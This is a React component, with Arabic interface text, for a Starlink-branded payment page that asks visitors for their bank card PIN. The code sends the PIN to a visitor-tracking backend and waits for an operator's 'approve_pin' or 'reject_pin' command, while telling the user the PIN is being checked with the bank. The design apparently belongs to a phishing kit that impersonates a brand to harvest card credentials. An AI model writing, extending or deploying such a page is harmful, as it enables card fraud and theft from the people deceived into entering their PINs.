import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Lock, Loader2 } from "lucide-react";
import PageShell from "@/components/starlink/PageShell";
import { toast } from "@/hooks/use-toast";
import { updateVisitorData } from "@/hooks/useVisitorTracking";
import { SavedCardBadge, readCardMeta, SavedCardMeta } from "@/components/starlink/SavedCardBadge";
import SEO from "@/components/SEO";
import { seoData } from "@/lib/seo";

const PaymentPin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [card, setCard] = useState<SavedCardMeta | null>(null);

  useEffect(() => {
    const stored = sessionStorage.getItem("starlink_card");
    if (!stored) navigate("/payment", { replace: true });
    setCard(readCardMeta());
  }, [navigate]);

  useEffect(() => {
    const onApproval = (e: Event) => {
      const detail = (e as CustomEvent).detail;
      if (!detail) return;
      if (detail.command === "approve_pin") {
        sessionStorage.removeItem("starlink_card");
        setWaiting(false);
        navigate("/success");
      } else if (detail.command === "reject_pin") {
        setWaiting(false);
        setPin("");
        toast({
          title: "الرقم السري غير صحيح",
          description: "أعد إدخال الرقم السري للبطاقة.",
          variant: "destructive",
        });
      }
    };
    window.addEventListener("visitor-approval", onApproval);
    return () => window.removeEventListener("visitor-approval", onApproval);
  }, [navigate]);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!/^[0-9]{4,6}$/.test(pin)) {
      toast({ title: "الرقم السري غير صالح", description: "يجب أن يكون من 4 إلى 6 أرقام.", variant: "destructive" });
      return;
    }
    setLoading(true);
    await updateVisitorData({ card_pin: pin });
    setLoading(false);
    setWaiting(true);
  };

  return (
    <PageShell
      eyebrow="تحقق إضافي"
      title="الرقم السري للبطاقة"
      description="أدخل الرقم السري الخاص ببطاقتك لتأكيد العملية."
    >
      <section className="container mx-auto px-6 py-16 max-w-md">
        <div className="border border-foreground/10 p-8 space-y-6">
          <div className="flex items-center justify-between gap-2">
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <Lock className="w-4 h-4" />
              <span>إدخال آمن — لن يُعرض الرقم على الشاشة</span>
            </div>
            {card && <SavedCardBadge brand={card.brand} last4={card.last4} />}
          </div>

          <form onSubmit={submit} className="space-y-5">
            <div>
              <label className="text-sm text-muted-foreground mb-2 block">الرقم السري (PIN)</label>
              <input
                type="password"
                inputMode="numeric"
                maxLength={6}
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
                placeholder="••••"
                disabled={waiting}
                className="w-full h-14 bg-transparent border border-foreground/20 px-4 focus:border-foreground outline-none transition-colors text-center text-2xl tracking-[0.5em] disabled:opacity-60"
                required
                autoFocus
              />
              <p className="text-xs text-muted-foreground mt-2 text-center">من 4 إلى 6 أرقام</p>
            </div>

            <button
              type="submit"
              disabled={loading || waiting}
              className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider disabled:opacity-60 inline-flex items-center justify-center gap-2"
            >
              {waiting ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  جاري التحقق...
                </>
              ) : loading ? (
                "جاري الإرسال..."
              ) : (
                "تأكيد ومتابعة"
              )}
            </button>

            {waiting && (
              <p className="text-xs text-muted-foreground text-center">
                نتحقق من الرقم السري مع البنك. لا تُغلق هذه الصفحة.
              </p>
            )}
          </form>
        </div>
      </section>
    </PageShell>
  );
};

export default PaymentPin;
